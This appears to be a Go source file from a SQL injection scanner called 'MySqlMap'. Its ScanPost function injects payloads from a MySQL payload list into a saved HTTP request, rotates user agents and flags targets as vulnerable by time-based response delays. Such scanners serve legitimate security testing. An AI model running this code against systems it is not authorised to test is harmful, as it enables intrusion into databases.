package code

import (
	"MySqlMap/payload"
	"fmt"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	ColorGreen = "\033[32m"
	ColorRed   = "\033[31m"
	ColorReset = "\033[0m"
	TextBold   = "\033[1m"
	TextUnbold = "\033[21m"
)

func ScanPost() {
	if len(os.Args) <= 2 {
		fmt.Println("Please use Command go run . -r request.txt")
		return
	}
	dataUserAgents := DataUserAgent()
	countUserAgent := -1
	payloads := payload.Read("./payload/mysql")
	content, err := os.ReadFile(os.Args[2])
	if err != nil {
		fmt.Println(err)
		return
	}
	requestStringArr := strings.Split(string(content), "\n")

	var wg sync.WaitGroup
	// var mutex sync.Mutex
	for _, node := range payloads {
		key, payload := node.Name, node.Payload
		countUserAgent++
		wg.Add(1)
		go func(keyValue, p string, countAgent int) {
			defer wg.Done()
			p = strings.ReplaceAll(p, "5", "10")
			p = url.QueryEscape(p)
			startTime := time.Now()
			response, err := makeHeaderBody(requestStringArr, p, dataUserAgents[countAgent%77])
			endTime := time.Now()
			elapsedTime := endTime.Sub(startTime)
			if err != nil {
				fmt.Println("Error sending HTTP request")
				return
			}

			if elapsedTime > time.Duration(9)*time.Second {
				fmt.Printf("%s(%s) %s %s vulnerable%s\n", ColorGreen+TextBold, response.Status, p, keyValue, ColorReset)

			} else {
				fmt.Printf("%s (%s) failed!%s\n", ColorRed, response.Status, ColorReset)
			}

		}(key, payload, countUserAgent)
	}
	wg.Wait()
}
